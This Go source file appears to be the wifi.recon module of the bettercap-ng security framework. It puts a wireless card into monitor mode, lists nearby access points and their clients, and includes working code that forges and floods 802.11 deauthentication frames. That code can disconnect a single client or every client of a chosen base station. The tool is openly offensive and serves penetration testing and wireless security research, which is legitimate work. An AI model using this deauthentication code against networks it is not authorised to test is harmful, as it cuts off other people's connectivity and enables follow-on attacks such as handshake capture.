package modules

import (
	"bytes"
	"errors"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"time"

	"github.com/evilsocket/bettercap-ng/core"
	"github.com/evilsocket/bettercap-ng/log"
	"github.com/evilsocket/bettercap-ng/network"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/dustin/go-humanize"
	"github.com/olekukonko/tablewriter"
)

type WDiscovery struct {
	session.SessionModule

	wifi         *WiFi
	stats        *WiFiStats
	handle       *pcap.Handle
	BroadcastMac []byte
	cliTarget    net.HardwareAddr
	apTarget     net.HardwareAddr
}

func NewWDiscovery(s *session.Session) *WDiscovery {
	w := &WDiscovery{
		SessionModule: session.NewSessionModule("wifi.recon", s),
		stats:         NewWiFiStats(),
		cliTarget:     make([]byte, 0),
		apTarget:      make([]byte, 0),
	}

	w.AddHandler(session.NewModuleHandler("wifi.recon on", "",
		"Start 802.11 wireless base stations discovery.",
		func(args []string) error {
			return w.Start()
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon off", "",
		"Stop 802.11 wireless base stations discovery.",
		func(args []string) error {
			return w.Stop()
		}))

	w.AddHandler(session.NewModuleHandler("wifi.deauth", "",
		"Start a 802.11 deauth attack (use ticker to iterate the attack).",
		func(args []string) error {
			return w.startDeauth()
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon set client MAC", "wifi.recon set client ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
		"Set client to deauth (single target).",
		func(args []string) error {
			var err error
			w.cliTarget, err = net.ParseMAC(args[0])
			return err
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon clear client", "",
		"Remove client to deauth.",
		func(args []string) error {
			w.cliTarget = make([]byte, 0)
			return nil
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon set bs MAC", "wifi.recon set bs ((?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2}))",
		"Set 802.11 base station address to filter for.",
		func(args []string) error {
			var err error
			if w.wifi != nil {
				w.wifi.Clear()
			}
			w.apTarget, err = net.ParseMAC(args[0])
			return err
		}))

	w.AddHandler(session.NewModuleHandler("wifi.recon clear bs", "",
		"Remove the 802.11 base station filter.",
		func(args []string) error {
			if w.wifi != nil {
				w.wifi.Clear()
			}
			w.apTarget = make([]byte, 0)
			return nil
		}))

	w.AddHandler(session.NewModuleHandler("wifi.show", "",
		"Show current hosts list (default sorting by essid).",
		func(args []string) error {
			return w.Show("essid")
		}))

	return w
}

func (w WDiscovery) Name() string {
	return "wifi.recon"
}

func (w WDiscovery) Description() string {
	return "A module to monitor and perform wireless attacks on 802.11."
}

func (w WDiscovery) Author() string {
	return "Gianluca Braga <matrix86@protonmail.com>"
}

func (w *WDiscovery) getRow(station *WiFiStation) []string {
	sinceStarted := time.Since(w.Session.StartedAt)
	sinceFirstSeen := time.Since(station.FirstSeen)

	bssid := station.HwAddress
	if sinceStarted > (justJoinedTimeInterval*2) && sinceFirstSeen <= justJoinedTimeInterval {
		// if endpoint was first seen in the last 10 seconds
		bssid = core.Bold(bssid)
	}

	seen := station.LastSeen.Format("15:04:05")
	sinceLastSeen := time.Since(station.LastSeen)
	if sinceStarted > aliveTimeInterval && sinceLastSeen <= aliveTimeInterval {
		// if endpoint seen in the last 10 seconds
		seen = core.Bold(seen)
	} else if sinceLastSeen > presentTimeInterval {
		// if endpoint not  seen in the last 60 seconds
		seen = core.Dim(seen)
	}

	traffic := ""
	bytes := w.stats.For(station.HW)
	if bytes > 0 {
		traffic = humanize.Bytes(bytes)
	}

	return []string{
		bssid,
		station.ESSID(),
		station.Vendor,
		strconv.Itoa(station.Channel),
		traffic,
		seen,
	}
}

func mhz2chan(freq int) int {
	if freq <= 2484 {
		return ((freq - 2412) / 5) + 1
	}

	return 0
}

type ByEssidSorter []*WiFiStation

func (a ByEssidSorter) Len() int      { return len(a) }
func (a ByEssidSorter) Swap(i, j int) { a[i], a[j] = a[j], a[i] }
func (a ByEssidSorter) Less(i, j int) bool {
	if a[i].ESSID() == a[j].ESSID() {
		return a[i].HwAddress < a[j].HwAddress
	}
	return a[i].ESSID() < a[j].ESSID()
}

type BywifiSeenSorter []*WiFiStation

func (a BywifiSeenSorter) Len() int      { return len(a) }
func (a BywifiSeenSorter) Swap(i, j int) { a[i], a[j] = a[j], a[i] }
func (a BywifiSeenSorter) Less(i, j int) bool {
	return a[i].LastSeen.After(a[j].LastSeen)
}

func (w *WDiscovery) showTable(header []string, rows [][]string) {
	fmt.Println()
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader(header)
	table.SetColWidth(80)
	table.AppendBulk(rows)
	table.Render()
}

func (w *WDiscovery) Show(by string) error {
	if w.wifi == nil {
		return errors.New("WiFi is not yet initialized.")
	}

	stations := w.wifi.List()
	if by == "seen" {
		sort.Sort(BywifiSeenSorter(stations))
	} else {
		sort.Sort(ByEssidSorter(stations))
	}

	rows := make([][]string, 0)
	for _, s := range stations {
		rows = append(rows, w.getRow(s))
	}

	w.showTable([]string{"BSSID", "SSID", "Vendor", "Channel", "Traffic", "Last Seen"}, rows)

	w.Session.Refresh()

	return nil
}

func (w *WDiscovery) buildDeauthPkt(address1 net.HardwareAddr, address2 net.HardwareAddr, address3 net.HardwareAddr, _type layers.Dot11Type, reason layers.Dot11Reason, seq uint16) []byte {
	var (
		deauthLayer   layers.Dot11MgmtDeauthentication
		dot11Layer    layers.Dot11
		radioTapLayer layers.RadioTap
	)

	deauthLayer.Reason = reason

	dot11Layer.Address1 = address1
	dot11Layer.Address2 = address2
	dot11Layer.Address3 = address3
	dot11Layer.Type = _type
	dot11Layer.SequenceNumber = seq

	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer,
		gopacket.SerializeOptions{
			ComputeChecksums: true,
			FixLengths:       true,
		},
		&radioTapLayer,
		&dot11Layer,
		&deauthLayer,
	)

	return buffer.Bytes()
}

func (w *WDiscovery) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64; seq++ {
		pkt := w.buildDeauthPkt(ap, client, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
		if err := w.handle.WritePacketData(pkt); err != nil {
			log.Error("Could not send deauth packet: %s", err)
			continue
		} else {
			time.Sleep(2 * time.Millisecond)
		}

		pkt = w.buildDeauthPkt(client, ap, ap, layers.Dot11TypeMgmtDeauthentication, layers.Dot11ReasonClass2FromNonAuth, seq)
		if err := w.handle.WritePacketData(pkt); err != nil {
			log.Error("Could not send deauth packet: %s", err)
			continue
		} else {
			time.Sleep(2 * time.Millisecond)
		}
	}
}

func (w *WDiscovery) startDeauth() error {
	isTargetingAP := len(w.apTarget) > 0
	if isTargetingAP {
		isTargetingCLI := len(w.cliTarget) > 0
		if isTargetingCLI {
			// deauth a specific client
			w.sendDeauthPacket(w.apTarget, w.cliTarget)
		} else {
			// deauth all AP's clients
			for _, station := range w.wifi.Stations {
				w.sendDeauthPacket(w.apTarget, station.HW)
			}
		}
		return nil
	}
	return errors.New("No base station or client set.")
}

func (w *WDiscovery) discoverAccessPoints(packet gopacket.Packet) {
	radiotapLayer := packet.Layer(layers.LayerTypeRadioTap)
	if radiotapLayer == nil {
		return
	}

	dot11infoLayer := packet.Layer(layers.LayerTypeDot11InformationElement)
	if dot11infoLayer == nil {
		return
	}

	dot11info, _ := dot11infoLayer.(*layers.Dot11InformationElement)
	if dot11info.ID != layers.Dot11InformationElementIDSSID {
		return
	}

	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return
	}

	dot11, _ := dot11Layer.(*layers.Dot11)
	ssid := string(dot11info.Info)
	bssid := dot11.Address3.String()
	dst := dot11.Address1

	// packet sent to broadcast mac with a SSID set?
	if bytes.Compare(dst, w.BroadcastMac) == 0 && len(ssid) > 0 {
		radiotap, _ := radiotapLayer.(*layers.RadioTap)
		channel := mhz2chan(int(radiotap.ChannelFrequency))
		w.wifi.AddIfNew(ssid, bssid, true, channel)
	}
}

func (w *WDiscovery) discoverClients(bs net.HardwareAddr, packet gopacket.Packet) {
	radiotapLayer := packet.Layer(layers.LayerTypeRadioTap)
	if radiotapLayer == nil {
		return
	}

	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return
	}

	dot11, _ := dot11Layer.(*layers.Dot11)
	if dot11.Type.MainType() != layers.Dot11TypeData {
		return
	}

	toDS := dot11.Flags.ToDS()
	fromDS := dot11.Flags.FromDS()

	if toDS && !fromDS {
		src := dot11.Address2
		bssid := dot11.Address1
		// packet going to this specific BSSID?
		if bytes.Compare(bssid, bs) == 0 {
			radiotap, _ := radiotapLayer.(*layers.RadioTap)
			channel := mhz2chan(int(radiotap.ChannelFrequency))
			w.wifi.AddIfNew("", src.String(), false, channel)
		}
	}
}

func (w *WDiscovery) Configure() error {
	var err error
	var ihandle *pcap.InactiveHandle

	if ihandle, err = pcap.NewInactiveHandle(w.Session.Interface.Name()); err != nil {
		return err
	}
	defer ihandle.CleanUp()

	if err = ihandle.SetRFMon(true); err != nil {
		return err
	} else if err = ihandle.SetSnapLen(65536); err != nil {
		return err
	} else if err = ihandle.SetTimeout(pcap.BlockForever); err != nil {
		return err
	} else if w.handle, err = ihandle.Activate(); err != nil {
		return err
	}

	w.wifi = NewWiFi(w.Session, w.Session.Interface)
	w.BroadcastMac, _ = net.ParseMAC(network.BroadcastMac)

	return nil
}

func (w *WDiscovery) updateStats(packet gopacket.Packet) {
	radiotapLayer := packet.Layer(layers.LayerTypeRadioTap)
	if radiotapLayer == nil {
		return
	}

	dot11infoLayer := packet.Layer(layers.LayerTypeDot11InformationElement)
	if dot11infoLayer == nil {
		return
	}

	dot11info, _ := dot11infoLayer.(*layers.Dot11InformationElement)
	if dot11info.ID != layers.Dot11InformationElementIDSSID {
		return
	}

	dot11Layer := packet.Layer(layers.LayerTypeDot11)
	if dot11Layer == nil {
		return
	}

	dot11, _ := dot11Layer.(*layers.Dot11)

	// FIXME: This doesn't consider the actual direction of the
	// packet (which address is the source, which the destination,
	// etc). It should be fixed and counter splitted into two
	// separete "Recvd" and "Sent" uint64 counters.
	bytes := uint64(len(packet.Data()))
	w.stats.Collect(dot11.Address1, bytes)
	w.stats.Collect(dot11.Address2, bytes)
	w.stats.Collect(dot11.Address3, bytes)
	w.stats.Collect(dot11.Address4, bytes)
}

func (w *WDiscovery) Start() error {
	if w.Running() == true {
		return session.ErrAlreadyStarted
	} else if err := w.Configure(); err != nil {
		return err
	}

	w.SetRunning(true, func() {
		defer w.handle.Close()
		src := gopacket.NewPacketSource(w.handle, w.handle.LinkType())
		for packet := range src.Packets() {
			if w.Running() == false {
				break
			}

			w.updateStats(packet)

			if len(w.apTarget) > 0 {
				w.discoverClients(w.apTarget, packet)
			} else {
				w.discoverAccessPoints(packet)
			}
		}
	})

	return nil
}

func (w *WDiscovery) Stop() error {
	return w.SetRunning(false, nil)
}
